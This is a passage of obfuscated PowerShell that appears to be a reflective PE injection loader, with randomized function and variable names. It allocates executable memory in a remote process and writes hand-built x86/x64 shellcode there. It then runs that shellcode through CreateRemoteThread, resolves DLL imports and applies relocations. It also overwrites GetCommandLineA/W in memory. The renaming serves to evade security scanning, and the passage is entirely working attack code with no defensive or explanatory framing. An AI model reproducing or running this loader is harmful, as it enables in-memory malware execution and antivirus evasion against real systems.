            }

            [IntPtr]$OUoKSWAL99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SjsRrlTg99)
            $vfVoYjxw99 = $YokgFkKj99.ReadProcessMemory.Invoke($hTcxIZqi99, $fMmwJMIc99, $OUoKSWAL99, [UIntPtr][UInt64]$SjsRrlTg99, [Ref]$VqeUSBMM99)
            if ($vfVoYjxw99 -eq $false)
            {
                Throw "Call to ReadProcessMemory failed"
            }
            [IntPtr]$jtGXsjsq99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OUoKSWAL99, [Type][IntPtr])

            $YokgFkKj99.VirtualFreeEx.Invoke($hTcxIZqi99, $fMmwJMIc99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
            $YokgFkKj99.VirtualFreeEx.Invoke($hTcxIZqi99, $EKgGeOpZ99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }
        else
        {
            [IntPtr]$YjqbtwZj99 = virtual -TUzdqtBB99 $hTcxIZqi99 -StartAddress $TekDefNc99 -LUTkGsDv99 $jYYhjxBf99 -YokgFkKj99 $YokgFkKj99
            $vfVoYjxw99 = $YokgFkKj99.WaitForSingleObject.Invoke($YjqbtwZj99, 20000)
            if ($vfVoYjxw99 -ne 0)
            {
                Throw "Call to CreateRemoteThread to call GetProcAddress failed."
            }

            [Int32]$dNkwoXdz99 = 0
            $vfVoYjxw99 = $YokgFkKj99.GetExitCodeThread.Invoke($YjqbtwZj99, [Ref]$dNkwoXdz99)
            if (($vfVoYjxw99 -eq 0) -or ($dNkwoXdz99 -eq 0))
            {
                Throw "Call to GetExitCodeThread failed"
            }

            [IntPtr]$jtGXsjsq99 = [IntPtr]$dNkwoXdz99
        }

        $YokgFkKj99.VirtualFreeEx.Invoke($hTcxIZqi99, $jYYhjxBf99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null

        return $jtGXsjsq99
    }

    Function dolmens
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $hTcxIZqi99,

        [Parameter(Position=1, Mandatory=$true)]
        [IntPtr]
        $hKsuKPcd99,

        [Parameter(Position=2, Mandatory=$true)]
        [IntPtr]
        $yacIbmFp99,#This can either be a ptr to a string which is the function name, or, if LoadByOrdinal is 'true' this is an ordinal number (points to nothing)

        [Parameter(Position=3, Mandatory=$true)]
        [Bool]
        $zmZkMCdQ99
        )

        $SjsRrlTg99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

        [IntPtr]$DfQDpKjn99 = [IntPtr]::Zero   #Pointer to the function name in remote process memory if loading by function name, ordinal number if loading by ordinal
        if (-not $zmZkMCdQ99)
        {
            $FunctionName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($yacIbmFp99)

            $yiqWFGgj99 = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
            $DfQDpKjn99 = $YokgFkKj99.VirtualAllocEx.Invoke($hTcxIZqi99, [IntPtr]::Zero, $yiqWFGgj99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            if ($DfQDpKjn99 -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process"
            }

            [UIntPtr]$VqeUSBMM99 = [UIntPtr]::Zero
            $BjJZNTzC99 = $YokgFkKj99.WriteProcessMemory.Invoke($hTcxIZqi99, $DfQDpKjn99, $yacIbmFp99, $yiqWFGgj99, [Ref]$VqeUSBMM99)
            if ($BjJZNTzC99 -eq $false)
            {
                Throw "Unable to write DLL path to remote process memory"
            }
            if ($yiqWFGgj99 -ne $VqeUSBMM99)
            {
                Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
            }
        }
        else
        {
            $DfQDpKjn99 = $yacIbmFp99
        }

        $iYisJnbh99 = $YokgFkKj99.GetModuleHandle.Invoke("kernel32.dll")
        $sBNkfTBY99 = $YokgFkKj99.GetProcAddress.Invoke($iYisJnbh99, "GetProcAddress") #Kernel32 loaded to the same address for all processes

        $ipXaPGPu99 = $YokgFkKj99.VirtualAllocEx.Invoke($hTcxIZqi99, [IntPtr]::Zero, [UInt64][UInt64]$SjsRrlTg99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
        if ($ipXaPGPu99 -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
        }

        [Byte[]]$JOQZSWNS99 = @()
        if ($PEInfo.PE64Bit -eq $true)
        {
            $vHQhzVNw99 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
            $MyfkIYSi99 = @(0x48, 0xba)
            $pqKsnRBr99 = @(0x48, 0xb8)
            $cYrFQovX99 = @(0xff, 0xd0, 0x48, 0xb9)
            $NDFbXLeq99 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
        }
        else
        {
            $vHQhzVNw99 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
            $MyfkIYSi99 = @(0xb9)
            $pqKsnRBr99 = @(0x51, 0x50, 0xb8)
            $cYrFQovX99 = @(0xff, 0xd0, 0xb9)
            $NDFbXLeq99 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
        }
        $HOBbxkho99 = $vHQhzVNw99.Length + $MyfkIYSi99.Length + $pqKsnRBr99.Length + $cYrFQovX99.Length + $NDFbXLeq99.Length + ($SjsRrlTg99 * 4)
        $HsgHcXzd99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($HOBbxkho99)
        $yPiEoovV99 = $HsgHcXzd99

        shirker -Bytes $vHQhzVNw99 -gPxdFgeU99 $HsgHcXzd99
        $HsgHcXzd99 = elastic $HsgHcXzd99 ($vHQhzVNw99.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($hKsuKPcd99, $HsgHcXzd99, $false)
        $HsgHcXzd99 = elastic $HsgHcXzd99 ($SjsRrlTg99)
        shirker -Bytes $MyfkIYSi99 -gPxdFgeU99 $HsgHcXzd99
        $HsgHcXzd99 = elastic $HsgHcXzd99 ($MyfkIYSi99.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($DfQDpKjn99, $HsgHcXzd99, $false)
        $HsgHcXzd99 = elastic $HsgHcXzd99 ($SjsRrlTg99)
        shirker -Bytes $pqKsnRBr99 -gPxdFgeU99 $HsgHcXzd99
        $HsgHcXzd99 = elastic $HsgHcXzd99 ($pqKsnRBr99.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($sBNkfTBY99, $HsgHcXzd99, $false)
        $HsgHcXzd99 = elastic $HsgHcXzd99 ($SjsRrlTg99)
        shirker -Bytes $cYrFQovX99 -gPxdFgeU99 $HsgHcXzd99
        $HsgHcXzd99 = elastic $HsgHcXzd99 ($cYrFQovX99.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($ipXaPGPu99, $HsgHcXzd99, $false)
        $HsgHcXzd99 = elastic $HsgHcXzd99 ($SjsRrlTg99)
        shirker -Bytes $NDFbXLeq99 -gPxdFgeU99 $HsgHcXzd99
        $HsgHcXzd99 = elastic $HsgHcXzd99 ($NDFbXLeq99.Length)

        $EKgGeOpZ99 = $YokgFkKj99.VirtualAllocEx.Invoke($hTcxIZqi99, [IntPtr]::Zero, [UIntPtr][UInt64]$HOBbxkho99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
        if ($EKgGeOpZ99 -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process for shellcode"
        }
        [UIntPtr]$VqeUSBMM99 = [UIntPtr]::Zero
        $BjJZNTzC99 = $YokgFkKj99.WriteProcessMemory.Invoke($hTcxIZqi99, $EKgGeOpZ99, $yPiEoovV99, [UIntPtr][UInt64]$HOBbxkho99, [Ref]$VqeUSBMM99)
        if (($BjJZNTzC99 -eq $false) -or ([UInt64]$VqeUSBMM99 -ne [UInt64]$HOBbxkho99))
        {
            Throw "Unable to write shellcode to remote process memory."
        }

        $YjqbtwZj99 = virtual -TUzdqtBB99 $hTcxIZqi99 -StartAddress $EKgGeOpZ99 -YokgFkKj99 $YokgFkKj99
        $vfVoYjxw99 = $YokgFkKj99.WaitForSingleObject.Invoke($YjqbtwZj99, 20000)
        if ($vfVoYjxw99 -ne 0)
        {
            Throw "Call to CreateRemoteThread to call GetProcAddress failed."
        }

        [IntPtr]$OUoKSWAL99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SjsRrlTg99)
        $vfVoYjxw99 = $YokgFkKj99.ReadProcessMemory.Invoke($hTcxIZqi99, $ipXaPGPu99, $OUoKSWAL99, [UIntPtr][UInt64]$SjsRrlTg99, [Ref]$VqeUSBMM99)
        if (($vfVoYjxw99 -eq $false) -or ($VqeUSBMM99 -eq 0))
        {
            Throw "Call to ReadProcessMemory failed"
        }
        [IntPtr]$vDoitCbn99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OUoKSWAL99, [Type][IntPtr])

        $YokgFkKj99.VirtualFreeEx.Invoke($hTcxIZqi99, $EKgGeOpZ99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        $YokgFkKj99.VirtualFreeEx.Invoke($hTcxIZqi99, $ipXaPGPu99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null

        if (-not $zmZkMCdQ99)
        {
            $YokgFkKj99.VirtualFreeEx.Invoke($hTcxIZqi99, $DfQDpKjn99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }

        return $vDoitCbn99
    }


    Function safeguarded
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Byte[]]
        $CVDncjuZ99,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $PEInfo,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $YokgFkKj99,

        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $gbwmFOmN99
        )

        for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
        {
            [IntPtr]$wSYKHVIA99 = [IntPtr](elastic ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$gbwmFOmN99.IMAGE_SECTION_HEADER)))
            $mfTEiANe99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($wSYKHVIA99, [Type]$gbwmFOmN99.IMAGE_SECTION_HEADER)

            [IntPtr]$XDhSzReH99 = [IntPtr](elastic ([Int64]$PEInfo.PEHandle) ([Int64]$mfTEiANe99.VirtualAddress))

            $caIyYAOF99 = $mfTEiANe99.SizeOfRawData

            if ($mfTEiANe99.PointerToRawData -eq 0)
            {
                $caIyYAOF99 = 0
            }

            if ($caIyYAOF99 -gt $mfTEiANe99.VirtualSize)
            {
                $caIyYAOF99 = $mfTEiANe99.VirtualSize
            }

            if ($caIyYAOF99 -gt 0)
            {
                raise -DQNljNKz99 "safeguarded::MarshalCopy" -PEInfo $PEInfo -StartAddress $XDhSzReH99 -Size $caIyYAOF99 | Out-Null
                [System.Runtime.InteropServices.Marshal]::Copy($CVDncjuZ99, [Int32]$mfTEiANe99.PointerToRawData, $XDhSzReH99, $caIyYAOF99)
            }

            if ($mfTEiANe99.SizeOfRawData -lt $mfTEiANe99.VirtualSize)
            {
                $BkoqUqde99 = $mfTEiANe99.VirtualSize - $caIyYAOF99
                [IntPtr]$StartAddress = [IntPtr](elastic ([Int64]$XDhSzReH99) ([Int64]$caIyYAOF99))
                raise -DQNljNKz99 "safeguarded::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $BkoqUqde99 | Out-Null
                $YokgFkKj99.memset.Invoke($StartAddress, 0, [IntPtr]$BkoqUqde99) | Out-Null
            }
        }
    }


    Function pterodactyls
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,

        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $KHphfewN99,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,

        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $gbwmFOmN99
        )

        [Int64]$lixlMYCo99 = 0
        $TtVWatDH99 = $true #Track if the difference variable should be added or subtracted from variables
        [UInt32]$WqPSOPmd99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$gbwmFOmN99.IMAGE_BASE_RELOCATION)

        if (($KHphfewN99 -eq [Int64]$PEInfo.EffectivePEHandle) `
                -or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
        {
            return
        }


        elseif ((prancer ($KHphfewN99) ($PEInfo.EffectivePEHandle)) -eq $true)
        {
            $lixlMYCo99 = smartphone ($KHphfewN99) ($PEInfo.EffectivePEHandle)
            $TtVWatDH99 = $false
        }
        elseif ((prancer ($PEInfo.EffectivePEHandle) ($KHphfewN99)) -eq $true)
        {
            $lixlMYCo99 = smartphone ($PEInfo.EffectivePEHandle) ($KHphfewN99)
        }

        [IntPtr]$KUEzRrGc99 = [IntPtr](elastic ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
        while($true)
        {
            $GWCAcoFB99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($KUEzRrGc99, [Type]$gbwmFOmN99.IMAGE_BASE_RELOCATION)

            if ($GWCAcoFB99.SizeOfBlock -eq 0)
            {
                break
            }

            [IntPtr]$KigKGRuv99 = [IntPtr](elastic ([Int64]$PEInfo.PEHandle) ([Int64]$GWCAcoFB99.VirtualAddress))
            $DaxdLOSZ99 = ($GWCAcoFB99.SizeOfBlock - $WqPSOPmd99) / 2

            for($i = 0; $i -lt $DaxdLOSZ99; $i++)
            {
                $CYgBfYpz99 = [IntPtr](elastic ([IntPtr]$KUEzRrGc99) ([Int64]$WqPSOPmd99 + (2 * $i)))
                [UInt16]$qGLFMyYI99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($CYgBfYpz99, [Type][UInt16])

                [UInt16]$aqywvPyS99 = $qGLFMyYI99 -band 0x0FFF
                [UInt16]$eLmZuCPQ99 = $qGLFMyYI99 -band 0xF000
                for ($j = 0; $j -lt 12; $j++)
                {
                    $eLmZuCPQ99 = [Math]::Floor($eLmZuCPQ99 / 2)
                }

                if (($eLmZuCPQ99 -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
                        -or ($eLmZuCPQ99 -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
                {
                    [IntPtr]$WvOyLgWm99 = [IntPtr](elastic ([Int64]$KigKGRuv99) ([Int64]$aqywvPyS99))
                    [IntPtr]$UhOuomrA99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WvOyLgWm99, [Type][IntPtr])

                    if ($TtVWatDH99 -eq $true)
                    {
                        [IntPtr]$UhOuomrA99 = [IntPtr](elastic ([Int64]$UhOuomrA99) ($lixlMYCo99))
                    }
                    else
                    {
                        [IntPtr]$UhOuomrA99 = [IntPtr](smartphone ([Int64]$UhOuomrA99) ($lixlMYCo99))
                    }

                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($UhOuomrA99, $WvOyLgWm99, $false) | Out-Null
                }
                elseif ($eLmZuCPQ99 -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
                {
                    Throw "Unknown relocation found, relocation value: $eLmZuCPQ99, relocationinfo: $qGLFMyYI99"
                }
            }

            $KUEzRrGc99 = [IntPtr](elastic ([Int64]$KUEzRrGc99) ([Int64]$GWCAcoFB99.SizeOfBlock))
        }
    }


    Function pennon
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $YokgFkKj99,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $gbwmFOmN99,

        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Constants,

        [Parameter(Position = 4, Mandatory = $false)]
        [IntPtr]
        $hTcxIZqi99
        )

        $vaNWervY99 = $false
        if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
        {
            $vaNWervY99 = $true
        }

        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
        {
            [IntPtr]$zwziMmkj99 = elastic ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)

            while ($true)
            {
                $cKNqCont99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($zwziMmkj99, [Type]$gbwmFOmN99.IMAGE_IMPORT_DESCRIPTOR)

                if ($cKNqCont99.Characteristics -eq 0 `
                        -and $cKNqCont99.FirstThunk -eq 0 `
                        -and $cKNqCont99.ForwarderChain -eq 0 `
                        -and $cKNqCont99.Name -eq 0 `
                        -and $cKNqCont99.TimeDateStamp -eq 0)
                {
                    Write-Verbose "Done importing DLL imports"
                    break
                }

                $xORxqlAj99 = [IntPtr]::Zero
                $OvOSKvQj99 = (elastic ([Int64]$PEInfo.PEHandle) ([Int64]$cKNqCont99.Name))
                $fWjWKxKV99 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($OvOSKvQj99)

                if ($vaNWervY99 -eq $true)
                {
                    $xORxqlAj99 = operation -hTcxIZqi99 $hTcxIZqi99 -OvOSKvQj99 $OvOSKvQj99
                }
                else
                {
                    $xORxqlAj99 = $YokgFkKj99.LoadLibrary.Invoke($fWjWKxKV99)
                }

                if (($xORxqlAj99 -eq $null) -or ($xORxqlAj99 -eq [IntPtr]::Zero))
                {
                    throw "Error importing DLL, DLLName: $fWjWKxKV99"
                }

                [IntPtr]$tNPeiTFD99 = elastic ($PEInfo.PEHandle) ($cKNqCont99.FirstThunk)
                [IntPtr]$RIDclNDp99 = elastic ($PEInfo.PEHandle) ($cKNqCont99.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
                [IntPtr]$wKZDRgmP99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RIDclNDp99, [Type][IntPtr])

                while ($wKZDRgmP99 -ne [IntPtr]::Zero)
                {
                    $zmZkMCdQ99 = $false
                    [IntPtr]$gskVvACK99 = [IntPtr]::Zero
                    [IntPtr]$qAWFUsFb99 = [IntPtr]::Zero
                    if([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4 -and [Int32]$wKZDRgmP99 -lt 0)
                    {
                        [IntPtr]$gskVvACK99 = [IntPtr]$wKZDRgmP99 -band 0xffff #This is actually a lookup by ordinal
                        $zmZkMCdQ99 = $true
                    }
                    elseif([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8 -and [Int64]$wKZDRgmP99 -lt 0)
                    {
                        [IntPtr]$gskVvACK99 = [Int64]$wKZDRgmP99 -band 0xffff #This is actually a lookup by ordinal
                        $zmZkMCdQ99 = $true
                    }
                    else
                    {
                        [IntPtr]$vmwscYjt99 = elastic ($PEInfo.PEHandle) ($wKZDRgmP99)
                        $vmwscYjt99 = elastic $vmwscYjt99 ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
                        $XlMOBolX99 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($vmwscYjt99)
                        $gskVvACK99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($XlMOBolX99)
                    }

                    if ($vaNWervY99 -eq $true)
                    {
                        [IntPtr]$qAWFUsFb99 = dolmens -hTcxIZqi99 $hTcxIZqi99 -hKsuKPcd99 $xORxqlAj99 -yacIbmFp99 $gskVvACK99 -zmZkMCdQ99 $zmZkMCdQ99
                    }
                    else
                    {
                        [IntPtr]$qAWFUsFb99 = $YokgFkKj99.GetProcAddressIntPtr.Invoke($xORxqlAj99, $gskVvACK99)
                    }

                    if ($qAWFUsFb99 -eq $null -or $qAWFUsFb99 -eq [IntPtr]::Zero)
                    {
                        if ($zmZkMCdQ99)
                        {
                            Throw "New function reference is null, this is almost certainly a bug in this script. Function Ordinal: $gskVvACK99. Dll: $fWjWKxKV99"
                        }
                        else
                        {
                            Throw "New function reference is null, this is almost certainly a bug in this script. Function: $XlMOBolX99. Dll: $fWjWKxKV99"
                        }
                    }

                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($qAWFUsFb99, $tNPeiTFD99, $false)

                    $tNPeiTFD99 = elastic ([Int64]$tNPeiTFD99) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
                    [IntPtr]$RIDclNDp99 = elastic ([Int64]$RIDclNDp99) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
                    [IntPtr]$wKZDRgmP99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RIDclNDp99, [Type][IntPtr])

                    if ((-not $zmZkMCdQ99) -and ($gskVvACK99 -ne [IntPtr]::Zero))
                    {
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($gskVvACK99)
                        $gskVvACK99 = [IntPtr]::Zero
                    }
                }

                $zwziMmkj99 = elastic ($zwziMmkj99) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$gbwmFOmN99.IMAGE_IMPORT_DESCRIPTOR))
            }
        }
    }

    Function suddenly
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [UInt32]
        $KLPLmdiz99
        )

        $VbaSSHRL99 = 0x0
        if (($KLPLmdiz99 -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
        {
            if (($KLPLmdiz99 -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
            {
                if (($KLPLmdiz99 -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $VbaSSHRL99 = $Win32Constants.PAGE_EXECUTE_READWRITE
                }
                else
                {
                    $VbaSSHRL99 = $Win32Constants.PAGE_EXECUTE_READ
                }
            }
            else
            {
                if (($KLPLmdiz99 -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $VbaSSHRL99 = $Win32Constants.PAGE_EXECUTE_WRITECOPY
                }
                else
                {
                    $VbaSSHRL99 = $Win32Constants.PAGE_EXECUTE
                }
            }
        }
        else
        {
            if (($KLPLmdiz99 -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
            {
                if (($KLPLmdiz99 -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $VbaSSHRL99 = $Win32Constants.PAGE_READWRITE
                }
                else
                {
                    $VbaSSHRL99 = $Win32Constants.PAGE_READONLY
                }
            }
            else
            {
                if (($KLPLmdiz99 -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $VbaSSHRL99 = $Win32Constants.PAGE_WRITECOPY
                }
                else
                {
                    $VbaSSHRL99 = $Win32Constants.PAGE_NOACCESS
                }
            }
        }

        if (($KLPLmdiz99 -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
        {
            $VbaSSHRL99 = $VbaSSHRL99 -bor $Win32Constants.PAGE_NOCACHE
        }

        return $VbaSSHRL99
    }

    Function tromps
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $YokgFkKj99,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,

        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $gbwmFOmN99
        )

        for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
        {
            [IntPtr]$wSYKHVIA99 = [IntPtr](elastic ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$gbwmFOmN99.IMAGE_SECTION_HEADER)))
            $mfTEiANe99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($wSYKHVIA99, [Type]$gbwmFOmN99.IMAGE_SECTION_HEADER)
            [IntPtr]$msKnVAeY99 = elastic ($PEInfo.PEHandle) ($mfTEiANe99.VirtualAddress)

            [UInt32]$jlYhAgUh99 = suddenly $mfTEiANe99.Characteristics
            [UInt32]$sRweWmlJ99 = $mfTEiANe99.VirtualSize

            [UInt32]$GPIsvIhG99 = 0
            raise -DQNljNKz99 "tromps::VirtualProtect" -PEInfo $PEInfo -StartAddress $msKnVAeY99 -Size $sRweWmlJ99 | Out-Null
            $BjJZNTzC99 = $YokgFkKj99.VirtualProtect.Invoke($msKnVAeY99, $sRweWmlJ99, $jlYhAgUh99, [Ref]$GPIsvIhG99)
            if ($BjJZNTzC99 -eq $false)
            {
                Throw "Unable to change memory protection"
            }
        }
    }

    Function barracks
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $YokgFkKj99,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,

        [Parameter(Position = 3, Mandatory = $true)]
        [String]
        $qYQiJIbR99,

        [Parameter(Position = 4, Mandatory = $true)]
        [IntPtr]
        $CIBvEfZI99
        )

        $HmNKCNVD99 = @()

        $SjsRrlTg99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        [UInt32]$GPIsvIhG99 = 0

        [IntPtr]$iYisJnbh99 = $YokgFkKj99.GetModuleHandle.Invoke("Kernel32.dll")
        if ($iYisJnbh99 -eq [IntPtr]::Zero)
        {
            throw "Kernel32 handle null"
        }

        [IntPtr]$SrDNJMHS99 = $YokgFkKj99.GetModuleHandle.Invoke("KernelBase.dll")
        if ($SrDNJMHS99 -eq [IntPtr]::Zero)
        {
            throw "KernelBase handle null"
        }

        $ZiHlfLDO99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($qYQiJIbR99)
        $UOvpuuvj99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($qYQiJIbR99)

        [IntPtr]$OHPtGaAh99 = $YokgFkKj99.GetProcAddress.Invoke($SrDNJMHS99, "GetCommandLineA")
        [IntPtr]$tuWrxdGF99 = $YokgFkKj99.GetProcAddress.Invoke($SrDNJMHS99, "GetCommandLineW")

        if ($OHPtGaAh99 -eq [IntPtr]::Zero -or $tuWrxdGF99 -eq [IntPtr]::Zero)
        {
            throw "GetCommandLine ptr null. GetCommandLineA: $(astonishingly $OHPtGaAh99). GetCommandLineW: $(astonishingly $tuWrxdGF99)"
        }

        [Byte[]]$UcgPyqfj99 = @()
        if ($SjsRrlTg99 -eq 8)
        {
            $UcgPyqfj99 += 0x48 #64bit shellcode has the 0x48 before the 0xb8
        }
        $UcgPyqfj99 += 0xb8

        [Byte[]]$DDOuHCgt99 = @(0xc3)
        $qjqAeCsI99 = $UcgPyqfj99.Length + $SjsRrlTg99 + $DDOuHCgt99.Length

        $aYCKEtzS99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($qjqAeCsI99)
        $ztknDJCF99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($qjqAeCsI99)
        $YokgFkKj99.memcpy.Invoke($aYCKEtzS99, $OHPtGaAh99, [UInt64]$qjqAeCsI99) | Out-Null
        $YokgFkKj99.memcpy.Invoke($ztknDJCF99, $tuWrxdGF99, [UInt64]$qjqAeCsI99) | Out-Null
        $HmNKCNVD99 += ,($OHPtGaAh99, $aYCKEtzS99, $qjqAeCsI99)
        $HmNKCNVD99 += ,($tuWrxdGF99, $ztknDJCF99, $qjqAeCsI99)

        [UInt32]$GPIsvIhG99 = 0
        $BjJZNTzC99 = $YokgFkKj99.VirtualProtect.Invoke($OHPtGaAh99, [UInt32]$qjqAeCsI99, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$GPIsvIhG99)
        if ($BjJZNTzC99 = $false)
        {
            throw "Call to VirtualProtect failed"
        }

        $RFJoVHLF99 = $OHPtGaAh99
        shirker -Bytes $UcgPyqfj99 -gPxdFgeU99 $RFJoVHLF99
        $RFJoVHLF99 = elastic $RFJoVHLF99 ($UcgPyqfj99.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($UOvpuuvj99, $RFJoVHLF99, $false)
        $RFJoVHLF99 = elastic $RFJoVHLF99 $SjsRrlTg99
        shirker -Bytes $DDOuHCgt99 -gPxdFgeU99 $RFJoVHLF99

        $YokgFkKj99.VirtualProtect.Invoke($OHPtGaAh99, [UInt32]$qjqAeCsI99, [UInt32]$GPIsvIhG99, [Ref]$GPIsvIhG99) | Out-Null


        [UInt32]$GPIsvIhG99 = 0
        $BjJZNTzC99 = $YokgFkKj99.VirtualProtect.Invoke($tuWrxdGF99, [UInt32]$qjqAeCsI99, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$GPIsvIhG99)
        if ($BjJZNTzC99 = $false)
        {
            throw "Call to VirtualProtect failed"
        }

        $yBxyscNb99 = $tuWrxdGF99
        shirker -Bytes $UcgPyqfj99 -gPxdFgeU99 $yBxyscNb99
        $yBxyscNb99 = elastic $yBxyscNb99 ($UcgPyqfj99.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($ZiHlfLDO99, $yBxyscNb99, $false)
        $yBxyscNb99 = elastic $yBxyscNb99 $SjsRrlTg99
        shirker -Bytes $DDOuHCgt99 -gPxdFgeU99 $yBxyscNb99

